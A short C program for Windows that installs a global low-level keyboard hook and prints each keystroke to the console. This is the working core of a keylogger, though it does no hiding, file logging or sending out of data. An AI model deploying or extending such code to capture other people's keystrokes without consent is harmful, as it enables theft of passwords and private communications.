#include <windows.h>
#include <stdio.h>

HHOOK hHook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) { 
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;

        if (wParam == WM_KEYDOWN) { 
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState); 

            char buffer[2] = {0};

            if (ToAscii(pKey->vkCode, pKey->scanCode, keyboardState, (LPWORD)buffer, 0) == 1) {
                printf("Key pressed: %c\n", buffer[0]); 
            } else {
                printf("Key pressed (m9wda sa7): %d\n", pKey->vkCode);
            }
        }
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void InstallHook() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hHook == NULL) {
        printf("Failed to install hook.\n");
        exit(1);
    } else {
        printf("Hook installed successfully.\n");
    }
}

void UninstallHook() {
    if (UnhookWindowsHookEx(hHook)) {
        printf("Hook removed successfully.\n");
    } else {
        printf("Failed to remove hook.\n");
    }
}

int main() {
    InstallHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UninstallHook();

    return 0;
}
